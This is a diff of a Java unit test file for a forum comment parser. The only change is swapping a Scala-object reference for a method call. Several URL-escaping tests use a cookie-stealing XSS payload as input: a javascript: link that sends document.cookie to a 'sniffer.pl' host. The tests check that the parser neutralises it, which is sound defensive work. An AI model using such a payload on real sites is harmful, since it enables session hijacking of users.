@@ -32,39 +32,39 @@ public class OldParserTest {
   @Test
   public void pTest() {
     assertEquals("<p>test\ntest1</p><p>test2</p>",
-        lorCodeService.parseComment("test\ntest1\n\ntest2", false, LorCodeService.Plain$.MODULE$));
+        lorCodeService.parseComment("test\ntest1\n\ntest2", false, LorCodeService.Plain()));
   }
 
   @Test
   public void tagEscapeTest() {
     assertEquals("<p>&lt;br&gt;</p>",
-        lorCodeService.parseComment("<br>", false, LorCodeService.Plain$.MODULE$));
+        lorCodeService.parseComment("<br>", false, LorCodeService.Plain()));
   }
 
   @Test
   public void urlEscapeTest() {
     assertEquals("<p><s title=\"javascript:var c=new Image();c.src=&quot;http://127.0.0.1/sniffer.pl?&quot;+document.cookie;close()\">Test</s></p>",
-        lorCodeService.parseComment("[url=javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()]Test[/url]", false, LorCodeService.Plain$.MODULE$));
+        lorCodeService.parseComment("[url=javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()]Test[/url]", false, LorCodeService.Plain()));
     assertEquals("<p><s>javascript:var c=new Image();c.src=&quot;http://127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s></p>",
-        lorCodeService.parseComment("[url]javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()[/url]", false, LorCodeService.Plain$.MODULE$));
+        lorCodeService.parseComment("[url]javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()[/url]", false, LorCodeService.Plain()));
   }
 
   @Test
   public void urlEscapeWithTagsTest() {
     assertEquals("<p><s title=\"javascript:var c=new Image();c.src=&quot;http://127.0.0.1/sniffer.pl?&quot;+document.cookie;close()\">T<i>e</i>st</s></p>",
-        lorCodeService.parseComment("[url=javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()]T[i]e[/i]st[/url]", false, LorCodeService.Plain$.MODULE$));
+        lorCodeService.parseComment("[url=javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()]T[i]e[/i]st[/url]", false, LorCodeService.Plain()));
   }
 
   @Test
   public void badListTest() {
     assertEquals("<p>0</p><ul><li>1</li><li>2</li></ul>",
-        lorCodeService.parseComment("[list]0[*]1[*]2[/list]", false, LorCodeService.Plain$.MODULE$));
+        lorCodeService.parseComment("[list]0[*]1[*]2[/list]", false, LorCodeService.Plain()));
   }
 
   @Test
   public void codeEscapeTest() {
     assertEquals("<div class=\"code\"><pre class=\"no-highlight\"><code>&quot;code&amp;code&quot;</code></pre></div>",
-        lorCodeService.parseComment("[code]\"code&code\"[/code]", false, LorCodeService.Plain$.MODULE$));
+        lorCodeService.parseComment("[code]\"code&code\"[/code]", false, LorCodeService.Plain()));
   }
 
 }
